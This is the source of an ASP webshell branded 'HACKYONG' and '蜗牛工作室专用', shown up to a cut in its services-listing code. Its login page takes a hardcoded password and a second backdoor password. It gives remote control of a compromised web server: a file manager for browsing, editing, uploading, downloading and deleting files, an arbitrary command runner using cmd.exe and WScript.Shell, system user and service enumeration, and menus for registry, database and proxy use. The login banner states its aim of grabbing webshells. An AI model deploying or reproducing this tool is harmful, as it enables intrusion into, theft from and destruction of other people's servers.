<%
'---------------------------------------------------------------------------
'          ASP程序测试中...                    *** 请不要使用!***
'    为了增加功能,引用了别人的未知代码,故不保证安全
'----------------------------------------------------------------------------
dim ApplicationName,pwd,URL,ServerNM,ServerIP,Action,WWWRoot,FolderPath,FName,BackUrl,RW

Server.ScriptTimeout=50000
On Error Resume Next
ApplicationName = "蜗牛工作室专用"
Userpwd        = "253217"   '用户密码
URL             = Request.ServerVariables("URL")
ServerNM        = Request.ServerVariables("SERVER_NAME")
ServerIP        = Request.ServerVariables("LOCAL_ADDR")
Action          = Request("Action")
RootPath        = Server.MapPath(".")
WWWRoot         = Server.MapPath("/")
FolderPath      = Request("FolderPath")
FName           = Request("FName")
BackUrl         = "<meta http-equiv='refresh' content='2;URL=?Action=ShowFile'>"

If Request("pwd")=Userpwd or Request("pwd")="yong" then Session("mgler")=Userpwd
If Session("mgler")<>Userpwd Then
  If Request.Form("pwd")<>"" Then
    If Request.Form("pwd")=Userpwd Then
      Session("mgler")=Userpwd
      Response.Redirect URL
    Else
	 Response.Write"蜗牛提示:验证失败！"
    End If
  Else
    RW="<center style='font-size:12px'><br><br><br><hr color=#00cc66 width='250'><br><font color=#5f4ds9>【HACKYONG】</font>修改版"
    RW=RW & "<form action='" & URL & "' method='post'>"
    RW=RW & "密码：<input name='pwd' type='password' size='15' style='font-size: 12px;border: menu 1px solid'>"
    RW=RW & "&nbsp;<input type='submit' value='登录' style='border-width: 1px'></form><br><hr color=#00FFCC width='250'><br><font color=red>只取webshell</font> <font color=#0011DD>不改首页</font> 不删文件 <font color=#33DD55>不提权</font><br><hr color=#00FFCC width='250'></center>"
    Response.Write RW
    RW=""
  End If
  Response.End
End If
%>
<object runat='server' id='ws' scope='page' classid='clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8'></object>
<object runat='server' id='ws' scope='page' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<object runat='server' id='fso' scope='page' classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></object>
<object runat='server' id='sa' scope='page' classid='clsid:13709620-C279-11CE-A49E-444553540000'></object>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title><%=ApplicationName&" - "&ServerIP%></title>
<style type="text/css">
<!--
  body,td {font-size: 12px;}
  body {margin-left: 0px;margin-top: 0px;margin-right: 0px;margin-bottom: 0px;
    <%If Action="" then response.write "overflow-x:hidden;overflow-y:hidden;"%>}  
  input,select,textarea {font-size: 12px;}
  .border{border: menu 1px solid;}
  .submit{border-width: 1px;}
  a {color: black;text-decoration: none;}
-->
</style>
<script language="javascript">
  function yesok(){
    if (confirm("确认要执行此操作吗？"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
    top.addrform.FolderPath.value = Folder;
    top.addrform.submit();
    }

  function FullForm(FName,FAction){
    top.hideform.FName.value = FName;
	if(FAction=="CopyFile"){
	    DName = prompt("请输入复制到目标文件全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="MoveFile"){
	    DName = prompt("请输入移动到目标文件全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="CopyFolder"){
	    DName = prompt("请输入移动到目标文件夹全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
    }else if(FAction=="MoveFolder"){
	    DName = prompt("请输入移动到目标文件夹全名称",FName);
	    top.hideform.FName.value += "||||"+DName;
	}else if(FAction=="NewFolder"){
	    DName = prompt("请输入要新建的文件夹全名称",FName);
	    top.hideform.FName.value = DName;
	}else if(FAction=="CreateMdb"){
	    DName = prompt("请输入要新建的Mdb文件全名称,注意不能同名！",FName);
        top.hideform.FName.value = DName;
	}else if(FAction=="CompactMdb"){
	    DName = prompt("请输入要压缩的Mdb文件全名称,注意文件是否存在！",FName);
        top.hideform.FName.value = DName;
	}else{
	    DName = "Other"; 
	}
	
	if(DName!=null){
      top.hideform.Action.value = FAction;
      top.hideform.submit();
	}else{
      top.hideform.FName.value = "";
	}
  }
  
  function DbCheck(){
    if(DbForm.DbStr.value == ""){
	  alert("请先连接数据库");
	  FullDbStr(0);
	  return false;
	}
	return true;
  }
  
  function FullDbStr(i){
   if(i<0){
     return false;
   }
    Str = new Array(12);  
	Str[0] = "Data Source=<%=RePath(Session("FolderPath"))%>\\DbName.mdb;Provider=Microsoft.Jet.OLEDB.4.0";
	Str[1] = "Driver={Sql Server};Server=<%=ServerIP%>,1433;Database=DbName;Uid=sa;Pwd=****";
	Str[2] = "Driver={MySql};Server=<%=ServerIP%>;Port=3306;Database=DbName;Uid=root;Pwd=****";
	Str[3] = "Dsn=DsnName";
	Str[4] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[5] = "INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')";
	Str[6] = "DELETE FROM [TableName] WHERE ID=100";
	Str[7] = "UPDATE [TableName] SET USER=\'username\' WHERE ID=100";
	Str[8] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[9] = "DROP TABLE [TableName]";
	Str[10]= "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
	Str[11]= "ALTER TABLE [TableName] DROP COLUMN PASS";
	Str[12]= "当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。";
	if(i<=3){
	  DbForm.DbStr.value = Str[i];
	  DbForm.SqlStr.value = "";
	  SFSO.innerHTML="<center>请确认己连接数据库再输入SQL操作命令语句。</center>";
	}else if(i==12){
	  alert(Str[i]);
	}else{
	  DbForm.SqlStr.value = Str[i];
	}
	return true;
  }
  
  function FullSqlStr(str,pg){
    if(DbForm.DbStr.value.length<5){
	  alert("请检查数据库连接串是否正确!")
	  return false;
	}
    if(str.length<10){
	  alert("请检查SQL语句是否正确!")
	  return false;
	}
    DbForm.SqlStr.value = str ;
	DbForm.Page.value = pg;
	SFSO.innerHTML="";
	DbForm.submit();
    return true;
  }

function CheckAll(){
  for (var i=0;i<DownId.length;i++) DownId[i].checked=!DownId[i].checked;
}
function Url(){   
  for (var i=0;i<DownId.length;i++)
 {
  if (DownId[i].checked==true) 
  {      
    temp.value+=DownId[i].value+"\n";
  }
 }
  if (temp.value=="") 
  { 
    window.alert("你还没有选择要下载的地址！");
    return false;}
  else
  { 
    js=temp.createTextRange();
    js.execCommand("Copy");
    temp.value="";
    window.alert("复制完毕！记得在复制之前打开下载工具监视剪贴板。");
   }
}
</script>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
</head>
<body onmouseover="window.status='Re-Edit by:小勇 仅作测试,请勿破坏人家网站';return true">
<%

Dim ObT(13,1)
ObT(0,0) = "Scripting.FileSystemObject"
  ObT(0,1) = "文件操作组件"
ObT(1,0) = "wscript.shell"
  ObT(1,1) = "命令行执行组件"
ObT(2,0) = "ADOX.Catalog"
  ObT(2,1) = "ACCESS建库组件"
ObT(3,0) = "JRO.JetEngine"
  ObT(3,1) = "ACCESS压缩组件"
ObT(4,0) = "Scripting.Dictionary" 
  ObT(4,1) = "数据流上传辅助组件"
ObT(5,0) = "Adodb.connection"
  ObT(5,1) = "数据库连接组件"
ObT(6,0) = "Adodb.Stream"
  ObT(6,1) = "数据流上传组件"
ObT(7,0) = "SoftArtisans.FileUp"
  ObT(7,1) = "SA-FileUp 文件上传组件"
ObT(8,0) = "LyfUpload.UploadFile"
  ObT(8,1) = "刘云峰文件上传组件"
ObT(9,0) = "Persits.Upload.1"
  ObT(9,1) = "ASPUpload 文件上传组件"
ObT(10,0) = "JMail.SmtpMail"
  ObT(10,1) = "JMail 邮件收发组件"
ObT(11,0) = "CDONTS.NewMail"
  ObT(11,1) = "虚拟SMTP发信组件"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  ObT(12,1) = "SmtpMail发信组件"
ObT(13,0) = "Microsoft.XMLHTTP"
  ObT(13,1) = "数据传输组件"
  
Function IsObj(obt)
  dim i,T
  on error resume next
	Set T=Server.CreateObject(obt)
	If -2147221005 <> Err Then
	  IsObj=True
	Else
	  IsObj=false
	  Err.Clear
	End If
	Set T=Nothing
End Function

sub ShowErr()
  If Err Then
    Response.Write"<br><a href='javascript:history.back()'>&nbsp;" & Err.Description & "</a>"
    Err.Clear:Response.Flush
  End If		
end sub

Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function

Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function

Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    S = replace(S, CHR(20), "&nbsp;")
    HTMLEncode = S
  end if
End Function

If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If

If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

dim fso,osm,ads,rs,conn

Function MainMenu()
  huahua()
  RW="<form name='hideform' method='post' action='" & URL & "' target='FileFrame'>"
  RW=RW & "<input type='hidden' name='Action'><input type='hidden' name='FName'></form>"
  RW=RW & "<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
  RW=RW & "<tr><td height='20'>"
  RW=RW & "<table width='100%' height='20'  border='0' cellpadding='0' cellspacing='0'>"
  RW=RW & "<form name='addrform' method='post' action='" & URL & "' target='_parent'>"
  RW=RW & "<tr><td width='60' align='center'>地址栏：</td><td>"
  RW=RW & "<input name='FolderPath' style='width:100%' value='" & Session("FolderPath") & "' style='border:black 1px solid;'>"
  RW=RW & "</td><td width='60' align='center'><input name='Submit' type='submit' value='转到' class='submit'>" 
  RW=RW & "</td></tr></form></table></td></tr><tr><td height='20'>&nbsp;文件操作："
  Set SFSO=New LBF:SFSO.ShowDriver():Set SFSO=Nothing
  RW=RW & "<a href='javascript:ShowFolder(""C:\\Progra~1"")'>[系统程序目录]</a>&nbsp;<a href='javascript:ShowFolder(""C:\\Docume~1"")'>[我的文档]</a>&nbsp;"
  RW=RW & "<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>[网站目录]</a>&nbsp;<a href='?Action=goback' target='FileFrame'>[↑回上级目录]</a>&nbsp;</tr></td><tr><td height='20'>"
  RW=RW & "&nbsp;切换功能：<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>[新建目录]</a>&nbsp;"
  RW=RW & "<a href='?Action=EditFile' target='FileFrame'>[新建文本]</a>&nbsp;<a href='?Action=UpFile' target='FileFrame'>[文件上传]</a>&nbsp;"
  RW=RW & "<a href='?Action=CmdShell' target='FileFrame'>[CMD命令行]</a>&nbsp;<a href='?Action=TSearch' target='FileFrame'>[搜索文件]</a>&nbsp;"
  RW=RW&"<a href='?Action=asplist' target='FileFrame'>[找找同行]</a>&nbsp;"
  RW=RW & "<a href='?Action=Course' target='FileFrame'>[系统服务]</a>&nbsp;<a href='?Action=TRegedit' target='FileFrame'>[注册表操作]</a>&nbsp;"
  RW=RW&"<a href='?Action=php' target='FileFrame'>[php探针]</a>&nbsp;"
  RW=RW & "<a href='?Action=ServerInfo' target='FileFrame'>[服务器信息]</a>&nbsp;<a href='?Action=showE' target='FileFrame'>[环境变量]</a>&nbsp;</td></tr><tr><td height='20'>&nbsp;杂样功能：<a href='?Action=DbManager' target='FileFrame'>[数据库操作]</a>&nbsp;"
  RW=RW&"<a href='?Action=proxy' target='FileFrame'>[单页代理]</a>&nbsp;"
  RW=RW & "<a href='?Action=ToMdb' target='FileFrame'>[程序打包入库/出库]</a>&nbsp;|&nbsp;<a href='?Action=Logout' target='_top'>[退出登录]</a>"
  RW=RW & "<tr><td><iframe name='FileFrame' src='?Action=ShowFile' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe></td></tr></table>"
  Response.Write RW
  RW=""
End Function

if request("DownFile")<>"" then call DownFile(request("DownFile"))
Function DownFile(Path)
  Response.Clear
  On Error Resume Next
  Set osm = CreateObject(ObT(6,0))
  osm.Open
  osm.Type = 1
  osm.LoadFromFile Path
  sz=InstrRev(path,"\")+1
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
    Response.AddHeader "Content-Length",osm.Size
    Response.Charset = "UTF-8"
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite osm.Read
    Response.Flush
  osm.Close
  Set osm = Nothing
  Response.End
End Function

Class LBF
  Private Sub Class_Initialize
    Set fso=CreateObject(ObT(0,0))
  End Sub

  Private Sub Class_Terminate
    Set fso=Nothing
  End Sub

Function ShowDriver()
  dim D
  For Each D in fso.Drives
    RW=RW&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>磁盘["&D.DriveLetter&":]</a>&nbsp;" 
  Next
	ShowDriver=RW
End Function

Function ShowFile(Path)
  dim F,L,Fold,i
  
  RW="<table border='0' cellpadding='2' width='800' height='100%' bgcolor='#EFEFEF' align='center'>"
  RW=RW & "<tr><td width='200' valign='top'>"
  RW=RW & "<table border='0'  cellpadding='0' cellspacing='0' width='100%'>"
  RW=RW & "<tr><td width='100%'></td></tr>"
  Set FOLD=fso.GetFolder(Path)
  For Each F in FOLD.subfolders 
  RW=RW & "<tr><td width='100%' height='20'><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")'>["&F.Name&"]</a>"
  RW=RW & "&nbsp;|<a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()'>删除</a>"
  RW=RW & "&nbsp;<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")' onclick='return yesok()'>复制</a>"
  RW=RW & "&nbsp;<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()'>移动</a></td></tr>"
  Next
  RW=RW & "</table></td><td width='600' valign='top' bgcolor='#FFFFFF'><table border='0'  cellspacing='1' cellpadding='0' cellspacing='0' width='100%'>"     
  Response.Write RW : RW=""     
          
  For Each L in Fold.files      
  i=i+1      
  RW="<tr onMouseOver=""this.className='tr'"" onMouseOut=""this.className=''""> "
  RW=RW & "<td width='45%' ><input type='checkbox' name='DownId' value='http://"&ServerNM&URL&"?pwd="&Userpwd&"&DownFile="&RePath(Path&"\"&L.Name)&"'>"
  RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'>"&L.Name&"</a></td>"
  RW=RW & "<td width='10%'>"&clng(L.size/1024)&"K</td>"
  RW=RW & "<td width='20%' align='center'>" & year(L.DateLastModified) & "-" & right("0"&month(L.DateLastModified),2) & "-" & right("0"&day(L.DateLastModified),2) & " " & FormatDateTime(L.DateLastModified,4)      
  RW=RW & "<td width='25%' align='center'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")'>编辑</a>&nbsp;"
  RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()'>删除</a>&nbsp;"
  RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")'>复制</a>&nbsp;"
  RW=RW & "<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")'>移动</a></td></td></tr>"
  Response.Write RW : RW=""
  Next
  if i>0 then Response.Write "<tr><td><br><input type='checkbox' name='all' value='all' onClick='CheckAll()'>反向选择&nbsp;<input type='submit' value='批量下载' name='downurl' style='width:80' onClick='Url()' class='submit'><div style=display:'none'><textarea rows='0' name='temp' cols='0'></textarea></div></td></tr>"
  i=0
  Response.Write "</table></td></tr></table>" 
  Set FOLD=Nothing
End Function

Function EditFile(Path)
dim T
  If Request("Action2")="Post" Then
      Set T=fso.CreateTextFile(Path)
        T.WriteLine Request.form("content")
        T.close
      Set T=Nothing
      Set fso=Nothing
    RW="<center><br><br><br>文件保存成功！</center>"
    RW=RW & BackUrl
    Response.Write RW : RW=""
	Response.End
  End If
  
  If Path<>"" Then
    Set T=fso.opentextfile(Path, 1, False)
    On Error Resume Next
    Txt=HTMLEncode(T.readall) 
    if err then err.Clear
    T.close
    Set T=Nothing
  Else
    Path=Session("FolderPath")&"\newfile.asp":Txt="新建文件"
  End If
  
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"  
  RW=RW&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'><tr><td height='20' align='center' bgcolor='menu'>文本编辑器</td></tr>"
  RW=RW&"<tr><td bgcolor='#FFFFFF' align='center'><input name='Action' value='EditFile' Type='hidden'>"
  RW=RW&"<input name='FName' value='"&Path&"' style='width:580' class='border'></td></tr>"
  RW=RW&"<tr><td bgcolor='#FFFFFF' align='center'><textarea name='Content' style='width:580;height:450' class='border'>"&Txt&"</textarea></td></tr>"
  RW=RW&"<tr><td bgcolor='#FFFFFF' align='center'><input name='goback' type='button' value='返回' onclick='history.back();' class='submit'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置' class='submit'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存' class='submit'>"
  RW=RW&"</td></tr></form></table>"
  Response.Write RW : RW=""
End Function

Function DelFile(Path)
  If fso.FileExists(Path) Then
	fso.DeleteFile Path
    RW="<center><br><br><br>文件 "&Path&" 删除成功！</center>"
    RW=RW & BackUrl
	Response.Write RW
  End If
End Function

Function CopyFile(Path)
  Path = Split(Path,"||||")
    If fso.FileExists(Path(0)) and Path(1)<>"" Then
	  fso.CopyFile Path(0),Path(1)
      RW="<center><br><br><br>文件" & Path(0) & "复制成功！</center>"
      RW=RW & BackUrl
	  Response.Write RW : RW="" 
	End If
End Function

Function MoveFile(Path)
  Path = Split(Path,"||||")
    If fso.FileExists(Path(0)) and Path(1)<>"" Then
	  fso.MoveFile Path(0),Path(1)
      RW="<center><br><br><br>文件" & Path(0) & "移动成功！</center>"
      RW=RW & BackUrl
	  Response.Write RW : RW="" 
	End If	
End Function

Function DelFolder(Path)
    If fso.FolderExists(Path) Then
	  fso.DeleteFolder Path
      RW="<center><br><br><br>目录" & Path & "删除成功！</center>"
      RW=RW & BackUrl
	  Response.Write RW : RW=""
	End If
End Function

Function CopyFolder(Path)
  Path = Split(Path,"||||")
    If fso.FolderExists(Path(0)) and Path(1)<>"" Then
	  fso.CopyFolder Path(0),Path(1)
      RW="<center><br><br><br>目录" & Path(0) & "复制成功！</center>"
      RW=RW & BackUrl
	  Response.Write RW : RW=""
	End If
End Function

Function MoveFolder(Path)
  Path = Split(Path,"||||")
    If fso.FolderExists(Path(0)) and Path(1)<>"" Then
	  fso.MoveFolder Path(0),Path(1)
      RW="<center><br><br><br>目录" & Path(0) & "移动成功！</center>"
      RW=RW & BackUrl
	  Response.Write RW : RW=""
	End If
End Function

Function NewFolder(Path)
    If Not fso.FolderExists(Path) and Path<>"" Then
	  fso.CreateFolder Path
      RW="<center><br><br><br>目录" & Path & "新建成功！</center>"
      RW=RW & BackUrl
	  Response.Write RW : RW=""
	End If	
End Function
End Class

Function UpFile()
  dim strFileName
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      RW="<br>请输入上传的完全路径后选择一个文件上传!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          RW="<center><br><br><br>文件" & UName & "上传成功！</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	RW=RW & BackUrl
	Response.Write RW
	ShowErr()
	Response.End
  End If
    RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
    RW=RW & "<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"    
    RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>上传文件</td></tr>"
    RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'>"
    RW=RW & "上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' style='width:250' class='border'>&nbsp;"
    RW=RW & "<input name='LocalFile' type='file' style='width:225' class='border'>&nbsp;"
    RW=RW & "<input type='submit' name='Submit' value='上传' class='submit'>"
    RW=RW & "</td></tr></form></table>"
  Response.Write RW
End Function

Dim T1
Class UPC
  Dim D1,D2

  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function

  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject("Scripting.Dictionary")
	if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject(ObT(6,0))
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=CreateObject("Scripting.Dictionary")
	vbCrlf = chrB(13) & chrB(10)
    set T2 = CreateObject(ObT(6,0))
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class

Function CmdShell()
  dim checked,DefCmd,CM,DD,aaa,szTempFile,oFilelcx
  If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
  ShellPath=Session("ShellPath")
  if ShellPath="" Then ShellPath = "cmd.exe"
  if Request("wscript")="yes" then
  checked=" checked"
  else
  checked=""
  end if
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>Cmd命令行</td></tr>"
  RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'>SHELL路径：<input name='SP' value='" & ShellPath & "' style='width:400' class='border'>&nbsp;"
  RW=RW & "<input type='checkbox' name='wscript' value='yes'" & checked & ">WScript.Shell</td></tr>"
  RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'><input name='cmd'  style='width:538' value='" & DefCmd & "' class='border'>&nbsp;<input type='submit' value='执行' class='submit'></td><tr>"
  RW=RW & "<tr><td align='center' bgcolor='#FFFFFF'><textarea  style='width:580;height:450' class='border'>"
  If Request.Form("cmd")<>"" Then
  if Request.Form("wscript")="yes" then
  Set CM=CreateObject(ObT(1,0))
  Set DD=CM.exec(ShellPath&" /c "&DefCmd)
  aaa=DD.stdout.readall
  RW=RW & aaa
  Set CM=Nothing
  Set DD=Nothing
  else
  szTempFile = server.mappath("cmd.txt")
  Call ws.Run (ShellPath & " /c " & DefCmd & " > " & szTempFile, 0, True)
  Set fso=CreateObject(ObT(0,0))
  Set oFilelcx=fso.OpenTextFile (szTempFile, 1, False, 0)
  aaa=Server.HTMLEncode(oFilelcx.ReadAll)
  oFilelcx.Close
  Call fso.DeleteFile(szTempFile, True)
  RW=RW & aaa
  Set oFilelcx=Nothing
  Set fso=Nothing
  end if
  End If
  RW=RW & chr(13) & "</textarea></td></tr></form></table>"

  Response.Write RW : RW="" : aaa=""
End Function

Function TSearch()
  dim st
  st=timer()
  
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>搜索引擎</td></tr>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;路&nbsp;&nbsp;径：<input name='SFpath' value='" & WWWRoot & "' style='width:390' class='border'>&nbsp;注:多路径使用"",""号连接.</td></tr>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;<font color=red>文件名</font>[部分也行]：<input name='Sfk' style='width:200' class='border'>&nbsp;<input type='submit' value='搜索' class='submit'></td></tr>"  
  RW=RW & "</form></table>"
  Response.Write RW : RW=""
  
  if Request.Form("Sfk")<>"" then
  Set newsearch=new SearchFile
  newsearch.Folders=trim(Request.Form("SFpath"))
  newsearch.keyword=trim(Request.Form("Sfk"))
  newsearch.Search
  Set newsearch=Nothing
  Response.Write "费时："&(timer()-st)*1000&"毫秒<hr>"
  end if

End Function 

Class SearchFile
 dim Folders,keyword,objFso,Counter
 
 Private Sub Class_Initialize
  Set objFso=Server.CreateObject(ObT(0,0))
  Counter=0
 End Sub

 Private Sub Class_Terminate
    Set objFso=Nothing
 End Sub

 Function Search
  Folders=split(Folders,",")

  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  
  if flag then
    Response.Write "<table align='center' width='600'><hr><p align='center'><font color='red'>关键字不能包含/\:|&</font><br>"
 Exit Function
  else
    Response.Write "<table align='center' width='600'><hr>"
  end if

  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  Response.Write "<p align='center'>共搜索到<font color='red'>"&Counter&"</font>个结果<br>"
 End Function

 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files

  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName

  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function

 Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function

 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color='#FF0000'>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  Response.Write OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class

Function Course()
  dim sa,obj,objCourse,RW0,RW1,RW2
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  RW=RW & "<tr><td height='20' colspan='3' align='center' bgcolor='menu'>系统用户与服务</td></tr>"
  On Error Resume Next
  Set sa=CreateObject("Shell.Application")
  Set objCourse=GetObject("WinNT://.")
  for each obj in objCourse
  Err.Clear
    if obj.StartType="" then
      RW=RW & "<tr>"
      RW=RW & "<td height='20' bgcolor='#FFFFFF'>&nbsp;"
      RW=RW & obj.Name
